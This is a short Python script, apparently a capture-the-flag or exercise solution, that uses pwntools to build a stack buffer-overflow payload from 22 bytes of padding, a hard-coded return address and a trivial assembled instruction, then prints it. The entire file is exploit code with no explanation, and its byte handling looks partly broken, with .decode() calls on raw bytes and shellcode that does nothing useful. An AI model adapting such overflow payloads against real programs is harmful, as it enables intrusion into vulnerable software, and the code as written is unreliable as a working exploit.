from pwn import * 
import struct 



def main():
    padding = 'A' * 22
    add = struct.pack('<L', 0x5655563f).decode()
    fuck = asm('mov eax, 0').decode()
    ex = padding + add + fuck
    print(ex)



if __name__ == "__main__":
    main()


    

